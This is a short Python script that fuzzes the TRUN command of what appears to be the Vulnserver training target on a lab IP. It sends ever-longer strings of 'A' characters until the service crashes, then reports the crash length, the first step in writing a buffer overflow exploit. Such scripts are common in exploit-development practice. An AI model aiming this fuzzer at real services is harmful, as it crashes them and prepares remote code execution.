import socket
import time
import sys

num = 100
sttring_send = "TRUN /.:/ " + "A" * num

while True:
    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect(("10.0.2.28", 9999))
        byte = sttring_send.encode(encoding="latin1")
        connection.send(byte)

        connection.close()
        sttring_send = sttring_send + "A" * num
        time.sleep(1)

    except Exception as E:
        print("crahed range :" + str(len(sttring_send)))
        print(E)
        sys.exit()

    except KeyboardInterrupt:
        print("\ncrahed range :" + str(len(sttring_send)))
        sys.exit()



